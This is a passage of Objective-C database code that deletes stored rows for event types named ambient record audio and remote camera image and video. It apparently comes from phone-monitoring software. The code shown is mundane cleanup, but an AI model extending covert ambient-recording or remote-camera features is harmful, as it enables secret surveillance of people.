		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAudio atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAudioThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAmbientRecordAudio atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAmbientRecordAudioThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeRemoteCameraImage atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeRemoteCameraVideo atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
    }
}

@end
